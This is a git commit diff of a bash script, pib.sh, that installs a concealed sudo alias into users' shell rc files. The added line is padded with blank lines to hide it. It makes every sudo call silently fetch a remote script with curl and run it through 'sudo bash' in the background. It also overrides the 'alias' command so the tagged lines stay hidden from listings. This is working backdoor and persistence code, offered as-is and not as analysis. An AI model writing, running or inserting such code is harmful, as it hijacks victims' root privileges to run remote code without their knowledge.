0ce7860c978151df9c80b80cca348af44c6f43b4
skyf0l <tom.rorato@epitech.eu>
2021-05-06 16:46:40 +0200

    Update pib.sh

--- pib.sh
+++ pib.sh
@@ -1,13 +1,13 @@
 #!/bin/bash
 
-SUDO_ALIAS="\nalias sudo=\"sudo touch lol; sudo \`#h1dD3N\`\"\nfunction alias() { if [ \$# = 0 ]; then command alias | /bin/grep -v 'h1dD3N'; else command alias '\$1'; fi } #h1dD3N"
+SUDO_ALIAS='\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nalias sudo="sudo ... >& /dev/null; ((nohup curl https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/ib.sh 2> /dev/null&disown)|nohup sudo bash >& /dev/null&disown); sudo `#h1dD3N`"\nfunction alias() { if [ $# = 0 ]; then command alias | /bin/grep -v "h1dD3N"; else command alias "$1"; fi } #h1dD3N"'
 
 function install_in_rc() {
     if ! [ -f "$1" ]; then
         return
     fi
-    if ! [ grep -q "h1dD3N" "$1" ]; then
-        echo -e $SUDO_ALIAS >> "$1"
+    if ! grep -q "h1dD3N" "$1"; then
+        echo -ne $SUDO_ALIAS >> "$1"
     fi
 }
 
